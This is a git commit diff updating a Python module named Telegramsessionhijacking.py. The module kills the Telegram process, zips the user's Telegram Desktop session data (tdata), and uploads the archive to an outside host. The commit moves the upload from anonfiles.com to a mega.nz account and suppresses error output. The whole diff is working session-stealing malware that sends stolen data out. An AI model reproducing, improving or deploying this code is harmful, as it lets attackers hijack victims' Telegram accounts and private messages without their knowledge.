0cc1448c9d89b9f2b01d99bd986471d425776069
Abdulrahman Mohammed <47694344+De3vil@users.noreply.github.com>
2024-02-26 20:18:35 +0200

    Update Telegramsessionhijacking.py
    Due to the closure of https://anonfiles.com/, I have modified the code, and it now uploads the results to https://mega.nz/.

--- modules_version2/Telegramsessionhijacking.py
+++ modules_version2/Telegramsessionhijacking.py
@@ -2,22 +2,26 @@ from shutil import make_archive
 from os import chdir , path , environ , system , getenv
 from time import sleep
 from requests import post
+from mega import Mega
 class MainfinTelegram:
     def __init__(self):
         self.name = getenv("Computername")
+        self.paths = path.join(environ["USERPROFILE"],"AppData","Roaming","Telegram Desktop")
     def ar(self):
-        paths = path.join(environ["USERPROFILE"],"AppData","Roaming","Telegram Desktop")
-        chdir(paths)
+        chdir(self.paths)
         make_archive(f"{self.name}", "zip" , "tdata")
-    def urlpars(self,token):
-        files = {'file': (f'{self.name}.zip', open(f"{self.name}.zip", 'rb'))}
-        url = f'https://api.anonfiles.com/upload?token={str(token)}'
-        post(url, files=files)
+    def urlpars(self,email,password):
+        chdir(self.paths)
+        self.Mega_up.login(email=email,password=password)
+        self.Mega_up.upload(f'{self.name}.zip')
+        #files = {'file': (f'{self.name}.zip', open(f"{self.name}.zip", 'rb'))}
+        #url = f'https://api.anonfiles.com/upload?token={str(token)}'
+        #post(url, files=files)
 
 class TER:
     def __init__(sefl):
         pass 
-    def telegramm(self , token):
+    def telegramm(self , email,password):
         telg = MainfinTelegram()
         while 1:
             try:
@@ -26,7 +30,7 @@ class TER:
                 system("taskkill /IM Telegram.exe /F")
                 telg.ar()
             try:
-                telg.urlpars(token)
+                telg.urlpars(email,password)
                 break
             except Exception as e:
-                print(e)
+                pass
